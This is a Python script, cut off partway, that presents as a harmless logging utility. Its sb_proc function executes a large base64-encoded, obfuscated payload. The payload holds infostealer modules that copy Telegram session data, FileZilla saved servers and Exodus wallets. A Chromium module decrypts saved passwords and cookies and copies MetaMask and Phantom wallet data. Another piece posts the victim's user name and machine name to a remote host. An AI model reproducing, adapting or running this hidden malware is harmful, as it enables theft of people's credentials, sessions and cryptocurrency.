#!/usr/bin/env python
import codecs
import os
import re
import sys
import tempfile
import random
import string
import datetime
import subprocess
from base64 import b64decode


def print(text: str, time=True):
    try:
        with open(f'{tempfile.gettempdir()}\\aiohttp_proxy5_logs.txt', 'a', encoding='utf8') as f:
            if time:
                now = datetime.datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
                f.write(f'{now} | {text}\n')
            else:
                f.write(f'{text}\n')
    except:
        pass



def rand():
    return ''.join(random.choice(string.ascii_lowercase) for i in range(12))

print(f'\n\nНачинается код', time=False)
print(sys.argv)

def sb_proc():
    exec(b64decode('X08wME8wMDBPTzAwTzAwTzBPID1iImZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWVcclxuXHJcblxyXG5jbGFzcyBUZWxlZ3JhbShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB0ZGF0YV9wYXRoID0gam9pbihwYXRoLCAndGRhdGEnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih0ZGF0YV9wYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHRlbGVncmFtX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3RlbGVncmFtJylcclxuICAgICAgICBpZiBub3QgaXNkaXIodGVsZWdyYW1fcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHRlbGVncmFtX3BhdGgpXHJcblxyXG4gICAgICAgIHJlc19wYXRoID0gam9pbih0ZWxlZ3JhbV9wYXRoLCBmJ3RkYXRhX3t0b2tlbl9oZXgoNCl9JylcclxuICAgICAgICBta2RpcihyZXNfcGF0aClcclxuXHJcbiAgICAgICAgYmxhY2tsaXN0ID0gWydkdW1wcycsICdlbW9qaScsICd1c2VyX2RhdGEnLCAnd29ya2luZyddXHJcblxyXG4gICAgICAgIGZvciBmIGluIHNjYW5kaXIodGRhdGFfcGF0aCk6XHJcbiAgICAgICAgICAgIGZpbGVfb2sgPSBUcnVlXHJcbiAgICAgICAgICAgIGZvciBpIGluIGJsYWNrbGlzdDpcclxuICAgICAgICAgICAgICAgIGlmIGkgaW4gZi5uYW1lOlxyXG4gICAgICAgICAgICAgICAgICAgIGZpbGVfb2sgPSBGYWxzZVxyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBpZiBub3QgZmlsZV9vazpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBmcm9tX3BhdGggPSBqb2luKHRkYXRhX3BhdGgsIGYubmFtZSlcclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbihyZXNfcGF0aCwgZi5uYW1lKVxyXG5cclxuICAgICAgICAgICAgZnVuYyA9IGNvcHlmaWxlIGlmIGYuaXNfZmlsZSgpIGVsc2UgY29weXRyZWVcclxuICAgICAgICAgICAgYXdhaXQgZnVuYyhmcm9tX3BhdGgsIGRlc3RfcGF0aClcclxuIiNsaW5lOjEKX08wT09PME9PT08wT08wT09PID1iImZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZVxyXG5cclxuXHJcblxyXG5jbGFzcyBGaWxlemlsbGEoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHNlYXJjaCA9IHsncmVjZW50c2VydmVycy54bWwnLCAnc2l0ZW1hbmFnZXIueG1sJ31cclxuICAgICAgICBmaWxlcyA9IHNlYXJjaC5pbnRlcnNlY3Rpb24oaS5uYW1lIGZvciBpIGluIHNjYW5kaXIocGF0aCkpXHJcblxyXG4gICAgICAgIGlmIG5vdCBmaWxlczpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHJlc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdmaWxlemlsbGEnKVxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihyZXNfcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHJlc19wYXRoKVxyXG4gICAgICAgIFxyXG4gICAgICAgIGZvciBmIGluIGZpbGVzOlxyXG4gICAgICAgICAgICBmaWxlbmFtZSA9IGYuc3BsaXQoJy4nKVswXVxyXG4gICAgICAgICAgICBkZXN0X3BhdGggPSBqb2luKHJlc19wYXRoLCBmJ3tmaWxlbmFtZX1fe3Rva2VuX2hleCg0KX0ueG1sJylcclxuICAgICAgICAgICAgYXdhaXQgY29weWZpbGUoam9pbihwYXRoLCBmKSwgZGVzdF9wYXRoKVxyXG4iI2xpbmU6MgpfT09PMDAwTzAwMDAwT09PTzAgPWIiZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHl0cmVlXHJcblxyXG5cclxuXHJcbmNsYXNzIEV4b2R1cyhQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgd2FsbGV0X2ZvbGRlciA9IGpvaW4ocGF0aCwgJ2V4b2R1cy53YWxsZXQnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih3YWxsZXRfZm9sZGVyKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHdhbGxldHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnd2FsbGV0cycpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHdhbGxldHNfcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuICAgICAgICBcclxuICAgICAgICBsb2dfZXhvZHVzX3BhdGggPSBqb2luKHdhbGxldHNfcGF0aCwgZidleG9kdXNfe3Rva2VuX2hleCg0KX0nKVxyXG5cclxuICAgICAgICBhd2FpdCBjb3B5dHJlZSh3YWxsZXRfZm9sZGVyLCBsb2dfZXhvZHVzX3BhdGgpIiNsaW5lOjMKX08wTzAwT09PME8wMDAwMDBPID1iImZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuaW1wb3J0IG9zXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pblxyXG5pbXBvcnQgcGxhdGZvcm1cclxuZnJvbSBhaW9odHRwIGltcG9ydCBDbGllbnRTZXNzaW9uXHJcbmZyb20gYWlvZmlsZXMgaW1wb3J0IG9wZW5cclxuXHJcblxyXG5cclxuY2xhc3MgRGV0YWlscygpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgdXNlciA9IG9zLmdldGxvZ2luKClcclxuICAgICAgICBwYyA9IHBsYXRmb3JtLm5vZGUoKVxyXG5cclxuICAgICAgICBkYXRhID0ge1xyXG4gICAgICAgICAgICAnY2xpZW50X2lkJzogc2VsZi5jb25mLmNsaWVudF9pZCxcclxuICAgICAgICAgICAgJ3VzZXJfbmFtZSc6IHVzZXIsXHJcbiAgICAgICAgICAgICdwY19uYW1lJzogcGNcclxuICAgICAgICB9XHJcbiAgICAgICAgXHJcbiAgICAgICAgdXJsID0gZid7c2VsZi5jb25mLmhvc3R9L3JlY2VpdmVfZGV0YWlscydcclxuXHJcbiAgICAgICAgYXN5bmMgd2l0aCBDbGllbnRTZXNzaW9uKCkgYXMgczpcclxuICAgICAgICAgICAgYXdhaXQgcy5wb3N0KHVybCwganNvbj1kYXRhKVxyXG5cclxuICAgICAgICBhc3luYyB3aXRoIG9wZW4oam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdkZXRhaWxzLnR4dCcpLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgYXdhaXQgZi53cml0ZShmJ3VzZXIgbmFtZToge3VzZXJ9XFxucGMgbmFtZToge3BjfScpIiNsaW5lOjQKX09PMDBPT08wT09PME9PTzAwID1iImZyb20gYXN5bmNpbyBpbXBvcnQgVGFzaywgY3JlYXRlX3Rhc2tcclxuZnJvbSB0eXBpbmcgaW1wb3J0IExpc3RcclxuZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zIGltcG9ydCBzY2FuZGlyLCBta2RpclxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW4sIGlzZGlyLCBpc2ZpbGUsIHNwbGl0XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZVxyXG5mcm9tIHBhdGhfc2VhcmNoIGltcG9ydCBzZWFyY2hfcGF0aHNcclxuaW1wb3J0IGFpb3NxbGl0ZVxyXG5mcm9tIC5kZWNyeXB0IGltcG9ydCBEZWNyeXB0b3JcclxuZnJvbSB0aW1lIGltcG9ydCB0aW1lXHJcbmZyb20gcGF0aHMgaW1wb3J0IFRFTVBcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlblxyXG5cclxuXHJcblxyXG5jbGFzcyBDaHJvbWl1bShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcbiAgICAgICAgc2VsZi5kZWNyeXB0b3IgPSBOb25lXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzZXRfZGVjcnlwdG9yKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGxvY2FsX3N0YXRlX2ZvbGRlcnMgPSB7XHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJyksXHJcbiAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgbG9jYWxfc3RhdGVzID0gW11cclxuICAgICAgICBhc3luYyBmb3IgaSBpbiBzZWFyY2hfcGF0aHMobG9jYWxfc3RhdGVfZm9sZGVycywgeydMb2NhbCBTdGF0ZSd9KTpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVzLmFwcGVuZChpKVxyXG5cclxuICAgICAgICBpZiBsb2NhbF9zdGF0ZXM6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlX3BhdGggPSBsb2NhbF9zdGF0ZXNbMF1cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZV9wYXRoID0gTm9uZVxyXG5cclxuICAgICAgICBzZWxmLmRlY3J5cHRvciA9IERlY3J5cHRvcihsb2NhbF9zdGF0ZV9wYXRoKVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfcGFzc3dvcmQoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgcm93cyA9IFtdXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgbG9naW5fZGF0YV9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgcm9vdF9wYXRoXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMobG9naW5fZGF0YV9mb2xkZXJfcGF0aHMsIHsnTG9naW4gRGF0YSd9KTpcclxuICAgICAgICAgICAgaWYgbm90IGlzZmlsZShwKTpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICB0ZW1wX3BhdGggPSBqb2luKFRFTVAsIGYnTG9naW4gRGF0YSB7dGltZSgpfScpXHJcbiAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKHAsIHRlbXBfcGF0aClcclxuXHJcbiAgICAgICAgICAgIGlmIG5vdCBzZWxmLmRlY3J5cHRvcjpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuc2V0X2RlY3J5cHRvcihyb290X3BhdGgpXHJcbiAgICAgICAgICAgIGFzeW5jIHdpdGggYWlvc3FsaXRlLmNvbm5lY3QodGVtcF9wYXRoKSBhcyBjb25uOlxyXG4gICAgICAgICAgICAgICAgc3FsID0gJ3NlbGVjdCAqIGZyb20gbG9naW5zJ1xyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBjb25uLmV4ZWN1dGUoc3FsKSBhcyBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgIGFzeW5jIGZvciByb3cgaW4gY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcm93cy5hcHBlbmQoKHJvd1sxXSwgcm93WzNdLCBzZWxmLmRlY3J5cHRvci5kZWNyeXB0X3Bhc3N3b3JkKHJvd1s1XSkpKVxyXG5cclxuICAgICAgICBpZiByb3dzOlxyXG4gICAgICAgICAgICBuYW1lID0gZid7c3BsaXQocm9vdF9wYXRoKVsxXX1fe3Rva2VuX2hleCg1KX0udHh0J1xyXG4gICAgICAgICAgICBwYXNzd29yZHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAncGFzc3dvcmRzJylcclxuICAgICAgICAgICAgcGF0aCA9IGpvaW4ocGFzc3dvcmRzX3BhdGgsIG5hbWUpXHJcblxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocGFzc3dvcmRzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgbWtkaXIocGFzc3dvcmRzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICBhc3luYyB3aXRoIG9wZW4ocGF0aCwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICBmb3IgdXJsLCBsb2dpbiwgcGFzc3dvcmQgaW4gcm93czpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGYnVVJMOiB7dXJsfVxcbkxvZ2luOiB7bG9naW59XFxuUGFzc3dvcmQ6IHtwYXNzd29yZH1cXG5cXG4nKVxyXG4gICAgICAgIFxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF9jb29raWVzKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgY29va2llcyA9ICcnXHJcblxyXG4gICAgICAgIGNvb2tpZV9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbmV0d29yaycpLCBcclxuICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnZGVmYXVsdCcpLFxyXG4gICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGFzeW5jIGZvciBwIGluIHNlYXJjaF9wYXRocyhjb29raWVfZm9sZGVyX3BhdGhzLCB7J0Nvb2tpZXMnLCAnY29va2llcy5zcWxpdGUnfSk6XHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2ZpbGUocCk6XHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgdGVtcF9wYXRoID0gam9pbihURU1QLCBmJ0Nvb2tpZXMge3RpbWUoKX0nKVxyXG4gICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShwLCB0ZW1wX3BhdGgpXHJcblxyXG4gICAgICAgICAgICBpZiBub3Qgc2VsZi5kZWNyeXB0b3I6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLnNldF9kZWNyeXB0b3Iocm9vdF9wYXRoKVxyXG4gICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgIHNxbCA9ICdzZWxlY3QgKiBmcm9tIGNvb2tpZXMnXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGNvbm4uZXhlY3V0ZShzcWwpIGFzIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgYXN5bmMgZm9yIHJvdyBpbiBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb252ID0gbGFtYmRhIHg6ICdUUlVFJyBpZiB4IGVsc2UgJ0ZBTFNFJ1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgaG9zdCA9IHJvd1sxXVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBodHRwX29ubHkgPSBjb252KHJvd1s5XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgcGF0aCA9IHJvd1s2XVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWN1cmUgPSBjb252KHJvd1s4XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgZXhwaXJhdGlvbl9kYXRlID0gc3RyKHJvd1s3XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9IHJvd1szXVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHZhbHVlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSAnJ1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgY29va2llID0gJ1xcdCcuam9pbihcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIChob3N0LCBodHRwX29ubHksIHBhdGgsIHNlY3VyZSwgZXhwaXJhdGlvbl9kYXRlLCBuYW1lLCB2YWx1ZSkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZXMgKz0gY29va2llICsgJ1xcbidcclxuXHJcbiAgICAgICAgaWYgY29va2llczpcclxuICAgICAgICAgICAgbmFtZSA9IGYne3NwbGl0KHJvb3RfcGF0aClbMV19X3t0b2tlbl9oZXgoNSl9LnR4dCdcclxuICAgICAgICAgICAgY29va2llc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdjb29raWVzJylcclxuICAgICAgICAgICAgcGF0aCA9IGpvaW4oY29va2llc19wYXRoLCBuYW1lKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKGNvb2tpZXNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICBta2Rpcihjb29raWVzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICBhc3luYyB3aXRoIG9wZW4ocGF0aCwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGNvb2tpZXMpXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF93YWxsZXRzKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgd2FsbGV0X2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnZGVmYXVsdCcsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKSwgXHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2xvY2FsIGV4dGVuc2lvbiBzZXR0aW5ncycpLCBcclxuICAgICAgICAgICAgam9pbihyb290X3BhdGgsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgd2FsbGV0cyA9IHtcclxuICAgICAgICAgICAgJ25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJzogJ21ldGFtYXNrJyxcclxuICAgICAgICAgICAgJ2JmbmFlbG1vbWVpbWhscG1nam5qb3BoaHBra29sanBhJzogJ3BoYW50b20nXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMod2FsbGV0X2ZvbGRlcl9wYXRocywgc2V0KHdhbGxldHMua2V5cygpKSk6XHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2RpcihwKTpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICB3YWxsZXRzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3dhbGxldHMnKVxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIod2FsbGV0c19wYXRoKTpcclxuICAgICAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgIG5hbWUgPSBzcGxpdChwKVsxXVxyXG4gICAgICAgICAgICB3YWxsZXRfbmFtZSA9IHdhbGxldHNbbmFtZV1cclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbih3YWxsZXRzX3BhdGgsIGYne3dhbGxldF9uYW1lfV97dG9rZW5faGV4KDQpfScpXHJcblxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBjb3B5dHJlZShwLCBkZXN0X3BhdGgpXHJcbiAgICAgICAgICAgIGV4Y2VwdDpcclxuICAgICAgICAgICAgICAgIHBhc3NcclxuICAgIFxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgY2hyb21pdW1fYnJvd3Nlcl9uYW1lcyA9IHtcclxuICAgICAgICAgICAgJ29wZXJhIGd4IHN0YWJsZScsXHJcbiAgICAgICAgICAgICdvcGVyYSBzdGFibGUnLFxyXG4gICAgICAgICAgICAnY2hyb21lJyxcclxuICAgICAgICAgICAgJ3lhbmRleGJyb3dzZXInXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICB0YXNrczogTGlzdFtUYXNrXSA9IFtdXHJcblxyXG4gICAgICAgIGZvciBmb2xkZXJfbmFtZSBpbiBjaHJvbWl1bV9icm93c2VyX25hbWVzLmludGVyc2VjdGlvbihpLm5hbWUubG93ZXIoKSBmb3IgaSBpbiBzY2FuZGlyKHBhdGgpKTpcclxuICAgICAgICAgICAgcm9vdF9wYXRoID0gam9pbihwYXRoLCBmb2xkZXJfbmFtZSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfcGFzc3dvcmQocm9vdF9wYXRoKSkpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX2Nvb2tpZXMocm9vdF9wYXRoKSkpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX3dhbGxldHMocm9vdF9wYXRoKSkpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgIGZvciB0YXNrIGluIHRhc2tzOlxyXG4gICAgICAgICAgICBhd2FpdCB0YXNrXHJcbiAgICAgICAgICAgICAgICAiI2xpbmU6NQppbXBvcnQgY29udGV4dGxpYiBhcyBfX3N0aWNreXRhcGVfY29udGV4dGxpYiAjbGluZTo2CkBfX3N0aWNreXRhcGVfY29udGV4dGxpYiAuY29udGV4dG1hbmFnZXIgI2xpbmU6NwpkZWYgX19PME9PME9PMDAwME9PME8wMCAoKTojbGluZTo4CglpbXBvcnQgdGVtcGZpbGUgLHNodXRpbCA7T08wTzAwTzBPTzAwME9PME8gPXRlbXBmaWxlIC5ta2R0ZW1wICgpI2xpbmU6OQoJdHJ5IDp5aWVsZCBPTzBPMDBPME9PMDAwT08wTyAjbGluZToxMAoJZmluYWxseSA6c2h1dGlsIC5ybXRyZWUgKE9PME8wME8wT08wMDBPTzBPICkjbGluZToxMQp3aXRoIF9fTzBPTzBPTzAwMDBPTzBPMDAgKClhcyBfX09PME8wTzBPT09PMDAwT09PIDojbGluZToxMgoJZGVmIF9fTzBPME8wT09PT08wTzBPMDAgKE9PMDBPT09PT09PT08wT08wICxPMDBPT09PME9PTzBPTzBPTyApOiNsaW5lOjEzCgkJT08wT09PT09PME8wT08wT08gPSd3Yic7aW1wb3J0IG9zICxvcyAucGF0aCAjbGluZToxNAoJCWRlZiBPMDBPT08wTzBPMDBPTzBPMCAoT08wME8wT08wTzBPT09PMDAgKTojbGluZToxNQoJCQlPT09PT09PMDAwMDBPTzBPTyA9T08wME8wT08wTzBPT09PMDAgLnNwbGl0ICgnLycpO09PTzBPTzAwT09PME8wTzBPID1fX09PME8wTzBPT09PMDAwT09PICNsaW5lOjE2CgkJCWZvciBPMDBPTzBPME8wME8wTzAwMCBpbiBPT09PT09PMDAwMDBPTzBPTyA6I2xpbmU6MTcKCQkJCU9PTzBPTzAwT09PME8wTzBPID1vcyAucGF0aCAuam9pbiAoT09PME9PMDBPT08wTzBPME8gLE8wME9PME8wTzAwTzBPMDAwICkjbGluZToxOAoJCQkJaWYgbm90IG9zIC5wYXRoIC5leGlzdHMgKE9PTzBPTzAwT09PME8wTzBPICk6I2xpbmU6MTkKCQkJCQlvcyAubWtkaXIgKE9PTzBPTzAwT09PME8wTzBPICkjbGluZToyMAoJCQkJCXdpdGggb3BlbiAob3MgLnBhdGggLmpvaW4gKE9PTzBPTzAwT09PME8wTzBPICwnX19pbml0X18ucHknKSxPTzBPT09PT08wTzBPTzBPTyApYXMgTzBPTzAwMDAwMDBPTzBPTzAgOk8wT08wMDAwMDAwT08wT08wIC53cml0ZSAoYidcbicpI2xpbmU6MjEKCQlPMDBPT08wTzBPMDBPTzBPMCAob3MgLnBhdGggLmRpcm5hbWUgKE9PMDBPT09PT09PT08wT08wICkpO09PMDAwTzBPMDAwME8wME9PID1vcyAucGF0aCAuam9pbiAoX19PTzBPME8wT09PTzAwME9PTyAsT08wME9PT09PT09PTzBPTzAgKSNsaW5lOjIyCgkJd2l0aCBvcGVuIChPTzAwME8wTzAwMDBPMDBPTyAsT08wT09PT09PME8wT08wT08gKWFzIE9PTzAwT09PMDAwTzBPMDBPIDpPT08wME9PTzAwME8wTzAwTyAud3JpdGUgKE8wME9PT08wT09PME9PME9PICkjbGluZToyMwoJaW1wb3J0IHN5cyBhcyBfX3N0aWNreXRhcGVfc3lzIDtfX3N0aWNreXRhcGVfc3lzIC5wYXRoIC5pbnNlcnQgKDAgLF9fT08wTzBPME9PT08wMDBPT08gKTtfX08wTzBPME9PT09PME8wTzAwI